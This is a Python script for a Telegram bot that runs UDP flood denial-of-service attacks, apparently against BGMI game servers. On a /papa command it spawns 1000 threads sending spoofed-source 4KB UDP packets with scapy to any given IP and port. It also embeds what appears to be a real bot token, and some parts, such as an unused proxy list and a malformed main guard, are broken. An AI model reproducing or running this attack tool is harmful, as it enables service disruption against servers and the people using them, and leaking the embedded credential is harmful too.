import requests
from telegram.ext import Updater, CommandHandler
from scapy.all import *
import threading
import random
import time
import os

BOT_TOKEN = "8369623947:AAGwr0m_9wR2XkgzTMSQ-34EcdjMU4avuFA"

def get_proxies():
    try:
        sources = [
            "https://api.proxyscrape.com/v2/?request=get&protocol=socks5&timeout=5000&country=all&ssl=all&anonymity=elite",
            "https://www.proxy-list.download/api/v1/get?type=socks5",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"
        ]
        proxies = []
        for url in sources:
            response = requests.get(url, timeout=10)
            proxies.extend([p.strip() for p in response.text.split('\n') if ':' in p])
        proxies = list(set(proxies))[:2000]  # Limit to 1000-2000 proxies
        with open('proxies.txt', 'w') as f:
            f.write('\n'.join(proxies))
        return proxies
    except:
        if os.path.exists('proxies.txt'):
            with open('proxies.txt', 'r') as f:
                return f.read().strip().split('\n')
        return ['socks5://45.76.153.45:1080', 'socks5://192.241.210.155:1080', 'socks5://104.248.112.219:1080']

def udp_flood(target_ip, port, duration, threads=1000):
    proxies = get_proxies()
    end_time = time.time() + duration
    def flood():
        while time.time() < end_time:
            proxy = random.choice(proxies)
            try:
                ip = IP(src=RandIP(), dst=target_ip)
                udp = UDP(sport=RandShort(), dport=port)
                packet = ip / udp / Raw(load=os.urandom(4096))  # 4KB payload
                send(packet, verbose=0)
            except:
                pass
    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.start()

def start(update, context):
    proxy_count = len(get_proxies())
    update.message.reply_text(f"Yo bhai! BGMI UDP Flood bot ready with {proxy_count} proxies. Use /papa <ip> <port> <time> or /manav.")

def manav(update, context):
    update.message.reply_text("ayw")

def papa(update, context):
    try:
        args = context.args
        if len(args) != 3:
            update.message.reply_text("Usage: /papa <ip> <port> <time> e.g., /papa 103.147.194.1 7777 300")
            return
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        update.message.reply_text(f"UDP Flood shuru on {target_ip}:{port} for {duration}s with 1000 threads! 🚀")
        threading.Thread(target=udp_flood, args=(target_ip, port, duration)).start()
    except Exception as e:
        update.message.reply_text(f"Error: {str(e)}")

def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("manav", manav))
    dp.add_handler(CommandHandler("papa", papa))
    updater.start_polling()
    updater.idle()

if name == 'main':
    main()